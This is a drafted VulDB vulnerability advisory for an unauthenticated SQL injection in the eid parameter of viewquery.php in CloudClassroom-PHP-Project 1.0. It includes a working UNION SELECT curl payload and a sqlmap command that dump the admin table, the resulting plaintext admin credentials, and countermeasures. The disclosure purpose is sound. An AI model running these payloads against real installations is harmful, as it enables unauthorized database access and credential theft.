# VulDB Submission — CloudClassroom-PHP-Project 1.0 — SQL Injection in viewquery.php (parameter eid)

> Template to submit at https://vuldb.com/?submit — fill in fields in corresponding form.

**Title:** CloudClassroom-PHP-Project 1.0 viewquery.php eid SQL Injection

| VulDB Field | Value |
|-------------|-------|
| Product | CloudClassroom-PHP-Project |
| Version | 1.0 |
| Vendor | Vishal Mathur |
| Vulnerability class | SQL Injection (UNION-based / error-based) |
| Affected component | viewquery.php (Component) |
| Affected parameter/argument | eid |
| Attack vector | Remote (Network) |
| Authentication | None (via Broken Access Control — item 00; design would require student session) |
| CWE | CWE-89 |
| CVSS 3.1 Base | 9.1 |
| CVSS 3.1 Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Exploit availability | Public (PoC included) |
| Countermeasure | Use prepared statements with parameter binding (`mysqli`/PDO) in 100% of queries. |

## Description

A vulnerability was found in CloudClassroom-PHP-Project 1.0. It has been classified as **Critical**.
This issue affects the component `viewquery.php` via the argument `eid`.
Parameter `eid` is interpolated in quotes in SELECT query. Closing the quote allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.

The manipulation leads to sql injection. The attack may be initiated remotely.

## Technical Details / Proof of Concept

```bash
curl -s -G "http://192.168.95.131:9292/viewquery.php" \
  --data-urlencode "eid=' UNION SELECT concat(0x5b,Aid,0x3a,Apass,0x5d),2,3,4 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/viewquery.php?eid=1" -p eid --batch --dump -T admin
```

Observed evidence:

```
[admin@ics.com:admin]
[vishu:vishu]
```

## Countermeasure

- Use prepared statements with parameter binding (`mysqli`/PDO) in 100% of queries.
- Enforce type casting for numeric identifiers (`(int)$id`) and use allowlist where applicable.
- Do not echo `$sql`/`mysqli_error()` to client (remove error oracle).
- Apply `exit;` after session guard (see item 00).

## Timeline

- 2026-08-02: Vulnerability discovered and confirmed (local lab).
- 2026-10-06: Advisory prepared / VulDB submission drafted.

## Credits

Researcher: oliveira.luanalmeida@gmail.com
